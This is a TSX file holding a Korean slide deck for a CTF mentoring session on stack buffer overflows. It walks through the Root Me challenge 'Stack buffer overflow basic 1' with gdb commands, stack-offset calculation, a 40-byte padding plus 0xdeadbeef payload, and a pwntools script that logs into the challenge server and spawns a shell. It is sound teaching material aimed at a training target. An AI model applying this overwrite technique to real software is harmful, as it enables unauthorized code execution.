import { MarkdownSlides } from "@/components/markdown-slides";

const slides = [
  `# 5주차. BOF 실습
  <br>

  Root Me의 **ELF x86 - Stack buffer overflow basic 1** 문제를 함께 해결하면서,
  Stack Buffer Overflow가 실제로 어떻게 exploit으로 이어지는지 정리합니다.
  <br>
  <br>

  ## 목표
  <br>

  - BOF를 "스택에서 어떤 값이 덮이는가" 관점으로 이해하기
  - C 코드와 어셈블리를 연결해서 변수 위치 확인하기
  - 이 문제에서 왜 RET가 아니라 \`check\` 변수를 덮어야 하는지 설명하기
  - pwntools로 원격 exploit 작성하기`,

  `# 오늘 멘토링 내용
  <br>

  ## 지난 과제 리뷰
  <br>

  ## BOF 개념 복습
  <br>

  ## Root Me 문제 분석
  <br>

  ## 스택 배치와 exploit 방향 결정
  <br>

  ## pwntools로 원격 exploit 작성`,

  `# 지난 과제 리뷰
  <br>

  ## 4주차 과제 1 — OverTheWire Bandit
  <br>

  - 과제 내용: **Level 6 → Level 10** 진행
  - 목표: SSH 접속, 리눅스 기본 명령어, 파일 탐색에 익숙해지기
  - 오늘 BOF 실습 전에 "원격 서버에 들어가서 바이너리를 실행한다"는 감각을 다시 맞추는 용도

  <br>

  ## 리뷰할 포인트
  <br>

  - \`ssh user@host -p <port>\` 로 접속하는 흐름이 익숙한지
  - \`ls\`, \`cd\`, \`cat\`, \`file\`, \`find\` 같은 기본 명령어를 사용할 수 있는지
  - 서버 안에서 "파일을 찾고 실행하는 과정"이 자연스러운지`,

  `# 지난 과제 리뷰
  <br>

  ## Bandit 6 ~ 8에서 쓴 명령어
  <br>

  \`\`\`bash
  # Level 6
  find . -size 1033c

  # Level 7
  find . -user bandit7 -group bandit6 -size 33c

  # Level 8
  vi data.txt
  :?millionth
  \`\`\`

  - \`find .\` : 현재 디렉터리 아래를 재귀적으로 탐색
  - \`-size 1033c\`, \`-size 33c\` : 크기가 정확히 1033바이트 / 33바이트인 파일 찾기
    - \`c\` 는 bytes 단위
  - \`-user\`, \`-group\` : 파일 소유자와 그룹 조건으로 필터링
  - \`vi\` 의 \`:?millionth\` : 파일 안에서 \`millionth\` 문자열을 **뒤쪽 방향으로 검색**
    - 긴 텍스트 파일에서 특정 키워드 위치를 찾을 때 유용`,

  `# 지난 과제 리뷰
  <br>

  ## Bandit 9 ~ 10에서 쓴 명령어
  <br>

  \`\`\`bash
  # Level 9
  sort data.txt | uniq -c

  # Level 10
  grep -a -E '=' data.txt
  \`\`\`

  - \`sort data.txt\` : 같은 줄끼리 붙도록 정렬
  - \`uniq -c\` : 연속해서 같은 줄이 몇 번 나왔는지 개수 출력
    - 중복 여부를 볼 때는 보통 \`sort\` 와 같이 사용
  - \`grep -a -E '=' data.txt\`
    - \`grep\` 으로 \`=\` 가 포함된 줄 찾기
    - \`-a\` : 바이너리처럼 보여도 텍스트로 취급
    - \`-E\` : 확장 정규표현식 사용

  <br>

  ## 이번 과제에서 익힌 감각
  <br>

  - 파일을 "직접 다 읽는" 대신 **조건으로 줄이고 찾기**
  - 긴 출력에서 **필요한 줄만 골라내기**
  - 원격 서버에서도 로컬 터미널처럼 명령어를 조합해서 해결하기`,

  `# BOF 개념 복습
  <br>

  ## Buffer Overflow란?
  <br>

  - 프로그램이 준비한 버퍼보다 더 긴 입력을 써서
  - **뒤에 있는 다른 메모리 값까지 덮어쓰는 취약점**
  - Stack에서 발생하면 지역변수, saved EBP, RET 등이 영향을 받을 수 있음

  <br>

  ## 항상 먼저 확인할 것
  <br>

  - 입력 버퍼의 크기
  - 실제 입력 함수가 몇 바이트까지 받는지
  - 버퍼 뒤에 놓인 값이 무엇인지
  - exploit 목표가 **RET overwrite** 인지, **변수 overwrite** 인지`,

  `# BOF 개념 복습
  <br>

  ## x86 스택 프레임
  <br>

  \`\`\`
  높은 주소
  [ebp+0x4]  RET
  [ebp]      saved EBP
  [ebp-...]  지역변수
  [esp]      현재 스택 맨 위
  낮은 주소
  \`\`\`

  - \`ESP\` : 현재 스택의 맨 위를 가리킴
  - \`EBP\` : 현재 함수가 기준으로 삼는 위치
  - BOF에서는 보통 \`[ebp-...]\` 쪽 버퍼가 넘치면서 위쪽 값을 덮음`,

  `# Root Me 문제 소개
  <br>

  ## 대상 문제
  <br>

  - **ELF x86 - Stack buffer overflow basic 1**
  - 사이트에 C 코드가 공개되어 있음
  - 목표: 쉘을 얻는 조건을 만족하도록 입력 만들기

  <br>

  ## 오늘의 접근 방식
  <br>

  1. C 코드로 취약점과 목표를 먼저 파악
  2. 어셈블리로 실제 변수 위치 확인
  3. 스택 거리 계산으로 exploit 방향 결정
  4. pwntools로 원격 서버에서 재현`,

  `# C 코드에서 먼저 볼 부분
  <br>

  ## 필요한 줄만 보기
  <br>

  \`\`\`c
  int check = 0x04030201;      // 목표로 덮을 변수
  char buf[40];                // 입력 버퍼

  fgets(buf, 45, stdin);       // 40바이트 버퍼에 최대 45바이트 요청

  if (check == 0xdeadbeef) {   // 최종 목표 조건
      system("/bin/bash");
  }
  \`\`\`

  - 코드 기준으로 볼 부분
    - \`char buf[40];\`
    - \`fgets(buf, 45, stdin);\`
    - \`if (check == 0xdeadbeef)\``,

  `# C 코드만 보고 세울 가설
  <br>

  ## 첫 판단
  <br>

  - 버퍼는 40바이트
  - \`fgets\` 는 길이 인자로 45를 받음
  - 따라서 **buf 바깥으로 최대 4바이트 + 개행 처리 구간**까지 영향을 줄 수 있음

  <br>

  ## 여기서 생기는 가설
  <br>

  - \`check\` 가 \`buf\` 바로 뒤에 있으면 \`0xdeadbeef\` 로 덮을 수 있다
  - 하지만 \`RET\` 까지 갈 수 있는지는 아직 모른다
  - 따라서 다음 단계는 **스택에서 변수 위치 확인**`,

  `# gdb 기본 명령어
  <br>

  ## 먼저 설정할 것
  <br>

  \`\`\`gdb
  set disassembly-flavor intel
  disas main
  \`\`\`

  - \`set disassembly-flavor intel\`
    - gdb의 어셈블리 출력 형식을 Intel 문법으로 변경
    - 이 자료의 어셈블리 표기와 맞추기 위해 먼저 설정
  - \`disas main\`
    - \`main\` 함수의 어셈블리 코드를 출력
    - C 코드와 실제 바이너리 동작을 연결할 때 출발점이 됨`,

  `# gdb 기본 명령어
  <br>

  ## 실행 흐름 따라가기
  <br>

  \`\`\`gdb
  b main
  run
  ni
  si
  \`\`\`

  - \`b main\` : \`main\` 함수 시작 지점에 breakpoint 설정
  - \`run\` : 프로그램 실행
  - \`ni\` (next instruction) : 현재 명령어 1개 실행
    - \`call\` 이 있어도 함수 안으로 들어가지 않고 다음 줄로 이동
  - \`si\` (step instruction) : 현재 명령어 1개 실행
    -\`call\` 이 있으면 함수 안으로 들어감

  <br>

  ## 보통 실습에서는
  <br>

  - 함수 프롤로그, \`sub esp, ...\` 까지는 \`ni\` 로 보는 경우가 많음
  - 특정 \`call\` 내부까지 보고 싶을 때만 \`si\` 사용`,

  `# gdb 기본 명령어
  <br>

  ## 레지스터와 스택 값 확인
  <br>

  \`\`\`gdb
  info registers
  x/40wx $esp
  x/wx $ebp
  x/wx $ebp+4
  \`\`\`

  - \`info registers\`
    - \`eax\`, \`ebx\`, \`ecx\`, \`edx\`, \`esp\`, \`ebp\`, \`eip\` 등 현재 레지스터 값 출력
  - \`x/40wx $esp\`
    - \`esp\` 부터 40개의 4바이트 값을 16진수로 확인
    - 현재 스택에 무엇이 쌓여 있는지 볼 때 사용
  - \`x/wx $ebp\` : \`[ebp]\` 확인
    - 즉 **saved EBP** 값 확인
  - \`x/wx $ebp+4\` : \`[ebp+4]\` 확인
    - 즉 **RET** 값 확인

  <br>`,

  `# 어셈블리 문법 기초
  <br>

  ## disassembly 읽는 형식
  <br>

  \`\`\`asm
  0x08048551 <+11>: mov ebp, esp   ; ebp = esp

  mov eax, [ebp-0x1c]              ; 메모리의 "값"을 읽음
  lea eax, [ebp-0x44]              ; 메모리의 "주소"를 계산함
  sub esp, 0x3c                    ; esp = esp - 0x3c
  \`\`\`

  - Intel 문법은 보통 **왼쪽이 목적지, 오른쪽이 원본**
  - \`[ebp-0x44]\` : \`ebp\` 기준 아래쪽 0x44 바이트 위치
  - \`lea\` 는 값을 읽는 게 아니라 **주소를 만드는 명령어**`,

  `# main 함수 시작 부분
  <br>

  ## 프롤로그에서 볼 것
  <br>

  \`\`\`asm
  lea  ecx, [esp+0x4]          ; 정렬 전 스택 위치 임시 저장
  and  esp, 0xfffffff0         ; esp를 16바이트 경계로 정렬
  push DWORD PTR [ecx-0x4]     ; 원래 return address 복원
  push ebp                     ; 이전 ebp 저장
  mov  ebp, esp                ; 현재 함수의 기준점 설정
  push esi                     ; 레지스터 백업
  push ebx                     ; 레지스터 백업
  push ecx                     ; 레지스터 백업
  sub  esp, 0x3c               ; 지역변수용 스택 공간 확보
  \`\`\`

  - 여기서 중요한 건 \`mov ebp, esp\` 와 \`sub esp, 0x3c\`
  - 이후 지역변수는 \`[ebp-...]\` 형태로 접근됨`,

  `# 이 문제에서 진짜 중요한 어셈블리
  <br>

  ## 변수 위치 확인
  <br>

  \`\`\`asm
  0x08048564: mov DWORD PTR [ebp-0x1c], 0x4030201 ; check = 0x04030201
  0x08048579: lea eax, [ebp-0x44]                 ; buf 시작 주소
  0x0804857d: call fgets@plt                      ; fgets(buf, 45, stdin)
  0x0804859e: push DWORD PTR [ebp-0x1c]           ; printf에 check 전달
  0x080485d4: cmp DWORD PTR [ebp-0x1c], 0xdeadbeef ; win 조건 비교
  \`\`\`

  - 코드 기준 위치
    - \`check\` 는 **[ebp-0x1c]**
    - \`buf\` 는 **[ebp-0x44]**
  - 이 두 줄이 exploit 방향을 결정한다`,

  `# 스택에서 거리 계산하기
  <br>

  ## exploit을 결정하는 핵심
  <br>

  \`\`\`
  [ebp+0x4]   RET
  [ebp]       saved EBP
  ...
  [ebp-0x1c]  check (4 bytes)
  [ebp-0x44]  buf[40]
  \`\`\`

  - \`buf → check\` 거리: \`0x44 - 0x1c = 0x28 = 40\` 바이트
  - \`buf → saved EBP\` 거리: \`0x44 = 68\` 바이트
  - \`buf → RET\` 거리: \`0x48 = 72\` 바이트

  <br>

  ## 결론
  <br>

  - buf를 40바이트 채우면 바로 다음 4바이트가 \`check\`
  - 하지만 \`RET\` 까지는 72바이트라서 도달할 수 없음`,

  `# 이 문제의 정답 방향
  <br>

  ## RET overwrite가 아니다
  <br>

  - \`fgets(buf, 45, stdin)\` 는 최대 44바이트만 읽음
  - 따라서 \`RET\` 를 덮는 exploit은 이 문제에서 불가능
  - 정답은 **인접 변수 overwrite**

  <br>

  ## 우리가 원하는 상태
  <br>

  \`\`\`
  check == 0xdeadbeef
  \`\`\`

  - 즉 이 문제는 제어 흐름을 바꾸는 문제라기보다
  - **분기 조건 변수를 원하는 값으로 만드는 문제**`,

  `# 최종 payload
  <br>

  ## payload 구조
  <br>

  \`\`\`python
  payload  = b"A" * 40
  payload += p32(0xdeadbeef)
  \`\`\`

  - 앞 40바이트: \`buf[40]\` 채우기
  - 뒤 4바이트: \`check\` 덮기
  - x86 리틀엔디안이므로 메모리에는 \`ef be ad de\` 순서로 들어감`,

  `# pwntools exploit
  <br>

  ## Root-Me 서버에서 실제로 동작한 방식
  <br>

  \`\`\`python
  from pwn import *

  s = ssh(
      user="app-systeme-ch13",
      host="challenge02.root-me.org",
      port=2222,
      password="app-systeme-ch13",
  )

  io = s.shell()                  # 원격 셸 확보
  io.sendline(b"./ch13")          # 셸에서 문제 바이너리 실행

  payload  = b"A" * 40
  payload += p32(0xdeadbeef)

  io.sendline(payload)            # fgets에 입력 전달
  io.interactive()                # 획득한 쉘 조작
  \`\`\``,

  `# 왜 shell 방식으로 실행했는가
  <br>

  ## 실습 중 확인한 점
  <br>

  - \`s.process("./ch13")\` 는 Root-Me 환경에서 실패
  - \`s.shell()\` 로 원격 셸을 연 뒤 \`./ch13\` 를 실행하니 정상 동작

  <br>

  ## 이해 포인트
  <br>

  - \`s.process()\` : 원격 서버에 "프로세스를 직접 실행" 요청
  - \`s.shell()\` : 원격 셸을 얻고, 그 셸 안에서 직접 실행
  - Root-Me 같은 환경에서는 **shell 방식이 더 안정적**일 수 있음`,

  `# 정리
  <br>

  ## 오늘 문제에서 기억할 것
  <br>

  - C 코드에서 \`buf\` 크기와 입력 길이를 먼저 본다
  - 어셈블리에서 \`[ebp-...]\` 로 변수 위치를 확인한다
  - 거리 계산으로 **RET까지 갈 수 있는지** 먼저 판단한다
  - 이 문제는 RET overwrite가 아니라 **\`check\` overwrite 문제**
  - 최종 exploit은 \`b"A"*40 + p32(0xdeadbeef)\``,

  `# 과제
  <br>

  ## 다음 주차 전까지 해올 것
  <br>

  - **[Root Me - ELF x86 - Stack buffer overflow basic 2](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-2)**

  <br>

  ## 과제 목표
  <br>

  - C 코드와 어셈블리를 보고 취약 지점 찾기
  - 버퍼와 목표 변수/RET 사이 거리 계산해 보기
  - 이번 주차와 비교해서 exploit 방식이 어떻게 달라지는지 정리하기

  <br>

  ## 해오면 좋은 것
  <br>

  - 사용한 gdb 명령어 메모
  - 최종 payload 구조
  - pwntools exploit 코드`,
];

export function Week5BofPracticeDeck() {
  return <MarkdownSlides slides={slides} />;
}
